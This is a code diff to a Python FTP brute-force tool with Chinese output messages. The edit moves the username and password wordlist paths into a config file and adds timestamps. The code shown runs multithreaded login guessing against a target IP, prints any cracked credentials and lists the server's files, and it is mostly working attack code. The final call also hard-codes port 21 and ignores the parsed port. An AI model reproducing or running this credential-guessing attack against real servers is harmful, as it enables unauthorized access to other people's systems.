@@ -3,13 +3,14 @@ import  sys
 import threading
 import queue
 from lib.choose import UseStyle
-
+from conf import config
+from lib.Auxiliary import current_time
 
 # 多线程
 def Thread(ip,port,quantity):
     Thread=queue.Queue()
-    for username in open('./blasting/ftp_blasting/user.txt'):
-        for password in open('./blasting/ftp_blasting/passwd.txt'):
+    for username in open(config.Specifyablastdictionary['ftp']['admin']):
+        for password in open(config.Specifyablastdictionary['ftp']['passwd']):
             username = username.replace('\n', '')
             password = password.replace('\n', '')
             diclist=username+'|'+password
@@ -34,18 +35,18 @@ def Log_in(Thread,ip,port):
 
                 ftp.login(user_passwd[0],user_passwd[1]) # 输入密码
 
-                print("破解成功正确：用户是"+user_passwd[0]+"密码是："+user_passwd[1])
+                print(current_time()+"破解成功正确：用户是"+user_passwd[0]+"密码是："+user_passwd[1])
                 print(ftp.retrlines('list'))
                 ftp.close()
 
 
             except ConnectionRefusedError:
-                print("连接被拒绝\n*可能对方没有开启FTP服务\n*或者你的地址和端口错误")
+                print(current_time()+"连接被拒绝\n*可能对方没有开启FTP服务\n*或者你的地址和端口错误")
                 break
         except ftplib.error_perm:
             ftp.close()
             # 原位输出
-            print('\r' + str(UseStyle("密码错误=====",fore='yellow')+f"用户：{UseStyle(user_passwd[0],fore='red')}"+f"密码: {UseStyle(user_passwd[1],fore='red')}"), end='', flush=True)
+            print(str(current_time()+UseStyle("密码错误: ",fore='yellow')+UseStyle("用户: "+user_passwd[0],fore='red')+UseStyle("密码: "+user_passwd[1],fore='red')))
 
 
 def enter():
@@ -64,11 +65,12 @@ def enter():
     quantity=sys.argv[3]
 
 def fill_in(ip,port,quantity):
-    if port==None or port=='':
+    if port==False or port=='':
         port=21
-    if quantity==None or quantity=='':
+    if quantity==False or quantity=='':
         quantity=1
-
-    print("默认线程数是"+str(quantity)+"端口是"+str(port))
-    print("现在扫描的是"+UseStyle((ip+ "端口是" + str(port)),mode='underline',fore='red'))
+    port = int(port)
+    quantity = int(quantity)
+    print(current_time()+"默认线程数是"+str(quantity)+"端口是"+str(port))
+    print(current_time()+"现在扫描的是"+UseStyle((ip+ "端口是" + str(port)),mode='underline',fore='red'))
     Thread(ip,21,quantity)
